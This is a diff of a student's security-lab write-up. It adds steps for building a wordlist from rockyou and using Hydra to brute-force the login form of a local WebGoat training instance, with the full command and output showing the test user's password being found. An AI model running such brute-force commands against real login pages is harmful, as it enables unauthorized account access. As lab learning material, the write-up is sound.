@@ -173,13 +173,31 @@ Doing this was quite slow on a Kali Linux running on a VirtualBox virtual machin
 
 ## c) Create a wordlist
 
-TBA.
+- I took first 100 entries from rockyou wordlist from Kali and appended few of my own entries to the wordlist.
+
+  ```shell
+  zcat /usr/share/wordlists/rockyou.txt.gz | head -100 > wordlist.txt
+  ```
 
 ---
 
 ## d) Try wordlist attack
 
-TBA.
+- I setup WebGoat with my [Vagrant setup](../Vagrantfile)
+- I used Hydra to bruteforce the password of WebGoat using my wordlist. I had created user testi123 with password testi123 on there.
+
+  ```shell
+  hydra -l testi123 -P wordlist.txt 172.28.128.4 -s 8080 http-post-form "/WebGoat/login:username=^USER^&password=^PASS^:F=error" -V
+  ```
+
+- Hydra found the correct password using the wordlist
+
+  ```shell
+  [ATTEMPT] target 172.28.128.4 - login "testi123" - pass "testi123" - 102 of 102 [child 3] (0/0)
+  [8080][http-post-form] host: 172.28.128.4   login: testi123   password: testi123
+  1 of 1 target successfully completed, 1 valid password found
+  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-11 05:41:46
+  ```
 
 ---
 
